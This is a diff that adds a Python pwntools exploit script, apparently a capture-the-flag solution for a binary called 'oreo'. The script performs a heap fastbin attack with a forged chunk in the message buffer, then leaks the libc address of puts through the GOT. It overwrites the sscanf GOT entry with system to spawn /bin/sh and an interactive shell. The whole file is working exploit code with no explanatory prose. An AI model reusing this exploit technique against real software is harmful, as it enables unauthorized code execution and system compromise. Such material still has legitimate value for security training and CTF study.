@@ -1,0 +1,78 @@
+#!/usr/bin/env python
+#  -*- coding: utf-8 -*-
+from pwn import *
+
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+bin = ELF("./oreo")
+s = process("./oreo")
+
+def add_rifle(name="", desc=""):
+    s.sendline("1")
+    s.sendline(name)
+    s.sendline(desc)
+    print "[add_r]", "name: ", repr(name), "desc: ", repr(desc)
+
+
+def show_rifles():
+    s.sendline("2")
+    s.recv()
+    print "[show_r]"
+
+def order_rifles():
+    s.sendline("3")
+    s.recvline()
+    print "[order_r]"
+
+
+def leave_msg(msg):
+    s.sendline("4")
+    s.sendline(msg)
+    print "[leave_msg]", "msg :", repr(msg)
+
+
+def show_stats():
+    s.sendline("5")
+    #  "Order Message: %s\n"
+    s.recvuntil("Order Message: ")
+    return s.recvline()[0:-1]
+
+p_fake_chunk = 0x0804a2a0
+p_fake_next_chunk = 0x804a2e0
+fake_next_size = "\x20"
+msg_buf = 0x804a2c0
+
+msg = "\x00" * (p_fake_next_chunk - msg_buf) + "\x00" * 4 + fake_next_size
+leave_msg(msg)
+
+for i in range(0, 63):
+    add_rifle("asdf")
+
+rifle = "A" * (52 - 25) + p32(p_fake_chunk + 0x8)
+# p_fake_chunk - 0x8 will be the argument of free()
+add_rifle(rifle)
+order_rifles()  # Now fast top is the fake_chunk
+
+# plt & got & offsets
+puts_got = bin.got["puts"]
+scanf_got = bin.got["__isoc99_sscanf"]
+
+o_system = libc.symbols["system"]
+o_puts = libc.symbols["puts"]
+
+
+rifle = p32(puts_got)
+add_rifle(desc = rifle)  # Now p_msgbuf doesn't point to msgbuf but puts_got
+leaked = show_stats()
+
+p_puts = u32(leaked[0:4])
+libcbase = p_puts - o_puts
+p_system = libcbase + o_system
+
+order_rifles()
+rifle = p32(scanf_got)
+add_rifle(desc = rifle)
+msg = p32(p_system)
+leave_msg(msg)  # Now scanf_plt() -> system()
+
+s.send("/bin/sh")
+s.interactive()
